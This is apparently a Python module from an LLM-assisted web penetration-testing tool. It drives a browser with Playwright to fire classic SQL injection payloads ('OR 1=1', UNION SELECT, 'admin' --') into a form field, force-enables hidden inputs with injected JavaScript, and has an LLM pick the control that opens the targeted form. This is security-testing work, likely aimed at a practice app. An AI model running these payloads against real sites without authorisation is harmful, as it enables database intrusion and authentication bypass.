import time
from typing import Dict, Optional, List
from script.scanner.page_asset import SiteAsset, InputField
# from script.attacker.payload.a01_sql_injection_payload import SQLInjectionPayloadLib # Assuming structure
from script.analysis.owasp_llm_analyzer import PotentialIssue
from attacker.attack_target import AttackResult
import os

class SQLInjectionAttacker:
    def __init__(self, llm_proxy):
        self.llm_proxy = llm_proxy
        self.context = None

    def exploit(self, issue: PotentialIssue, site_asset: SiteAsset, session_context: Dict) -> AttackResult:
        """
        Core SQL Injection attack logic: Based on pure browser interaction (DOM Interaction).
        Simulates user input and submission to trigger vulnerabilities via frontend routing or form submission.
        """
        # 1. Get Playwright Page Context
        if 'playwright_page' in session_context:
            self.context = session_context['playwright_page'].context
        else:
            return AttackResult(
                success=False, vulnerability_type='SQL Injection', severity="Error",
                proof_of_concept='', details="Missing playwright_page in session_context"
            )

        print(f"[*] Analyzing Issue: {issue.owasp_category} at {issue.location}")

        # 2. Resolve Target: Retrieve InputField object by ID
        target_input: Optional[InputField] = None
        if issue.related_input_id is not None:
            for page in site_asset.pages.values():
                for inp in page.inputs:
                    if inp.internal_id == issue.related_input_id:
                        target_input = inp
                        break
                if target_input: break

        if not target_input:
            return AttackResult(
                success=False, vulnerability_type='SQL Injection', severity="Info",
                proof_of_concept='', details=f"Target InputField (ID: {issue.related_input_id}) not found."
            )

        print(f"[*] Target resolved: {target_input.tag} name='{target_input.name}' on {target_input.page_url}")

        # 3. Prepare Payloads
        # Infer context to select more precise payloads
        context_type = self._infer_context_type(target_input, issue)
        # payloads = SQLInjectionPayloadLib.get_payloads(context=context_type) # Placeholder
        # Temporary payloads for SQLi until library is available
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT 1,2,3 --",
            "admin' --",
            '" OR "1"="1'
        ]
        print(f"[*] Loaded {len(payloads)} payloads for context: {context_type}")

        # 4. Execute Attack Loop
        page = self.context.new_page()
        try:
            # Enter core interaction logic
            result = self._execute_interaction_attack(page, target_input, payloads)
            if result:
                return result

        except Exception as e:
            print(f"[!] Attack Session Error: {e}")
        finally:
            page.close()

        return AttackResult(
            success=False, vulnerability_type='SQL Injection', severity="Low",
            proof_of_concept='', request_snapshot={}, response_snapshot="",
            details="All interaction attempts failed."
        )

    def _execute_interaction_attack(self, page, target_input: InputField, payloads: List[str]) -> Optional[AttackResult]:
        """
        Core method: Fill -> Activate -> Submit -> Listen/Check
        """
        # [Step 0] Environment Reset
        self._reset_page_state(page, target_input.page_url)

        # [Step 1] Dismiss Annoyances
        self._dismiss_annoyances(page)

        # [Step 2] Activate Input
        self._ensure_input_active(page, target_input)

        for payload in payloads:
            sqli_triggered = False
            success_payload = ""
            evidence_text = ""

            try:
                # A. Ensure visible again
                self._ensure_input_active(page, target_input)

                # B. Fill Payload (using force=True)
                page.fill(target_input.css_selector, payload, force=True)

                # C. Trigger Submission
                page.press(target_input.css_selector, "Enter")

                # D. Wait for reaction
                # Wait longer for SQLi as it might be a server timeout or page reload
                page.wait_for_timeout(2000) 

                # E. Check for SQL Injection Indicators
                content = page.content().lower()
                
                # Simple heuristic for SQL Errors
                error_signatures = [
                    "syntax error",
                    "fatal error",
                    "mysql_fetch",
                    "you have an error in your sql syntax",
                    "unclosed quotation mark",
                    "sqlstate",
                    "ora-",  # Oracle
                    "psqlexception" # Postgres
                ]

                # Heuristic for Authentication Bypass (e.g. if we are suddenly logged in or see "admin")
                # This is context dependent, maybe 'Welcome' or 'Logout' or 'Dashboard'
                # For now, we stick to error detection or generic changes.
                
                found_error = False
                for sig in error_signatures:
                    if sig in content:
                        found_error = True
                        evidence_text = f"Found SQL error signature: {sig}"
                        break
                
                if found_error:
                    print(f"\n{'=' * 50}")
                    print(f"[★] Captured Success Payload (Copy & Paste to Reproduce):")
                    print(f"Payload: {payload}")
                    print(f"{'=' * 50}\n")

                    print(f"[+] SQL Injection Triggered! Evidence: {evidence_text}")
                    sqli_triggered = True
                    success_payload = payload
                    
                    self._save_evidence(page, f"sqli_success_{int(time.time())}.png")

                    return AttackResult(
                        success=True, vulnerability_type='SQL Injection', severity="High",
                        proof_of_concept=success_payload, request_snapshot={}, response_snapshot=evidence_text,
                        details=f"DOM interaction successfully triggered SQL Injection."
                    )

            except Exception as e:
                # print(f"[-] Payload execution error: {e}")
                pass
        
        return None

    def _ensure_input_active(self, page, target_input: InputField):
        """
        [Three-Layer Activation Strategy] Ensure target input is visible and usable.
        Level 1: Static Heuristics (Fast)
        Level 2: LLM Semantic Discovery (Accurate)
        Level 3: JS Force (Robust)
        """
        selector = target_input.css_selector

        # 0. Quick check
        if page.is_visible(selector) and page.is_enabled(selector):
            return

        print(f"[*] Input {selector} is hidden/disabled. Starting activation sequence...")

        # Level 2 and 3 fallback (Simplified for brevity, assuming full logic is needed)
        # ---------------------------------------------------------
        # Level 2: LLM Discovery
        # ---------------------------------------------------------
        llm_selector = self._find_toggle_via_llm(page)
        if llm_selector:
            try:
                print(f"[*] Level 2: Clicking LLM-identified toggle {llm_selector}")
                page.click(llm_selector, timeout=2000, force=True)
                page.wait_for_timeout(1000)
                if page.is_visible(selector):
                    print("[+] Activated via Level 2 (LLM).")
                    return
            except Exception as e:
                print(f"[-] Level 2 click failed: {e}")

        # ---------------------------------------------------------
        # Level 3: JS Force
        # ---------------------------------------------------------
        print(f"[*] Levels 1 & 2 failed. Engaging Level 3 (JS Force) on {selector}.")
        try:
            page.evaluate(f"""
                const el = document.querySelector('{selector}');
                if (el) {{
                    el.removeAttribute('disabled');
                    el.removeAttribute('readonly');
                    el.removeAttribute('hidden');
                    el.removeAttribute('aria-hidden');

                    el.style.display = 'block';
                    el.style.visibility = 'visible';
                    el.style.opacity = '1';
                    el.style.pointerEvents = 'auto';

                    el.style.position = 'fixed';
                    el.style.top = '10%;';
                    el.style.left = '10%';
                    el.style.width = '300px';
                    el.style.height = '50px';
                    el.style.zIndex = '2147483647';
                    el.style.backgroundColor = 'white';
                    el.style.border = '5px solid red';
                }}
            """)
            page.wait_for_timeout(200)
            print("[+] Input forcefully enabled via JS (Level 3).")
        except Exception as e:
            print(f"[!] Level 3 failed: {e}")

    def _infer_context_type(self, target_input: InputField, issue: PotentialIssue) -> str:
        """Simple context inference"""
        # For SQLi, context might be 'string', 'integer', 'search', etc.
        # This is valid for placeholder logic
        if target_input.input_type == "number":
            return "integer"
        return "string"

    def _find_toggle_via_llm(self, page) -> Optional[str]:
        """
        [Level 2] Semantic Awareness
        """
        print("[*] Level 1 failed. Engaging LLM (Level 2) to visually identify toggle...")

        candidates = page.evaluate("""() => {
            const allElements = document.querySelectorAll('*');
            const candidates = [];
            let idCounter = 0;

            allElements.forEach(el => {
                const style = window.getComputedStyle(el);
                if (style.display === 'none' || style.visibility === 'hidden' || parseFloat(style.opacity) === 0 || el.offsetParent === null) {
                    return;
                }

                const textContent = el.innerText || el.textContent || "";
                const rawText = textContent.slice(0, 50).replace(/\\n/g, ' ').trim();

                let className = "";
                if (typeof el.className === 'string') {
                    className = el.className;
                } else if (el.getAttribute) {
                    className = el.getAttribute('class') || "";
                }

                const tagName = el.tagName;
                const role = el.getAttribute('role');
                const cursor = style.cursor;
                const ariaLabel = el.getAttribute('aria-label') || "";

                const rawAttr = (el.id + className + ariaLabel).toLowerCase();
                const isInteractive = ['BUTTON', 'A', 'INPUT', 'IMG', 'SVG'].includes(tagName) || role === 'button' || cursor === 'pointer';
                # For SQLi/XSS on search bars, looking for 'search' triggers is still valid
                const hasKeyword = rawAttr.includes('search') || rawAttr.includes('find') || rawAttr.includes('query') || rawAttr.includes('login') || rawAttr.includes('sign');

                if (isInteractive || hasKeyword) {
                    if (candidates.length >= 30) return;

                    candidates.push({
                        id: idCounter,
                        tag: tagName,
                        text: rawText,
                        aria_label: ariaLabel,
                        class: className,
                        cursor: cursor, 
                        is_icon: rawAttr.includes('icon') || tagName === 'I' || tagName === 'SVG' || tagName === 'PATH'
                    });

                    el.setAttribute('data-pt-llm-id', idCounter);
                    idCounter++;
                }
            });
            return candidates;
        }""")

        if not candidates:
            return None

        import json
        candidates_json = json.dumps(candidates, indent=2)

        prompt = f"""
        I am an automated testing agent. I need to find the specific UI element that **opens/toggles the input form or search bar** that I need to attack.
        
        Here is the JSON list of interactive elements found on the current page:
        {candidates_json}

        Task: Analyze the 'text', 'class', 'aria_label' and 'is_icon' fields.
        Identify the element that is most likely the "Search Toggle" or "Login Button" or whatever opens the target input.
        
        Output Requirement:
        Return ONLY the integer 'id' of the best candidate.
        If you are not sure or none match, return -1.
        Do not output any explanation.
        """

        try:
            response = self.llm_proxy.complete(prompt)
            import re
            match = re.search(r'-?\d+', str(response))
            if match:
                target_id = int(match.group())
                if target_id != -1:
                    print(f"[+] LLM identified candidate ID {target_id} as toggle.")
                    return f"[data-pt-llm-id='{target_id}']"
        except Exception as e:
            print(f"[!] LLM analysis failed: {e}")

        return None

    def _dismiss_annoyances(self, page):
        """
        Dismiss common overlays/popups
        """
        print("[*] Attempting to dismiss overlays/popups...")
        try:
            dismiss_selectors = [
                "button[aria-label='Close Welcome Banner']",
                ".close-dialog",
                "button:has-text('Dismiss')",
                "a[aria-label='dismiss cookie message']",
                "button:has-text('Me want it')",
                "button:has-text('Accept')"
            ]

            for sel in dismiss_selectors:
                if page.is_visible(sel):
                    page.click(sel, force=True)
                    page.wait_for_timeout(200)

            page.evaluate("""
                const backdrops = document.querySelectorAll('.cdk-overlay-backdrop, .modal-backdrop');
                backdrops.forEach(b => b.remove());
            """)
        except:
            pass

    def _reset_page_state(self, page, url: str):
        """
        Hard Reset
        """
        print(f"[*] Resetting page state for {url}...")

        try:
            page.goto("about:blank")
            context = page.context
            context.clear_cookies()
            page.goto(url, timeout=15000, wait_until="domcontentloaded")
            page.evaluate("sessionStorage.clear(); localStorage.clear();")
            page.reload(wait_until="domcontentloaded")

        except Exception as e:
            print(f"[!] Page reset failed: {e}")
            raise e

        print("[+] Page reset complete. DOM is fresh.")

    def _save_evidence(self, page, filename="sqli_success.png"):
        base_dir = os.getcwd()
        screenshot_dir = os.path.join(base_dir, "screenshots")

        if not os.path.exists(screenshot_dir):
            os.makedirs(screenshot_dir)

        full_path = os.path.join(screenshot_dir, filename)

        try:
            page.screenshot(path=full_path)
            print(f"[*] Screenshot saved to: {full_path}")
        except Exception as e:
            print(f"[!] Failed to save screenshot: {e}")
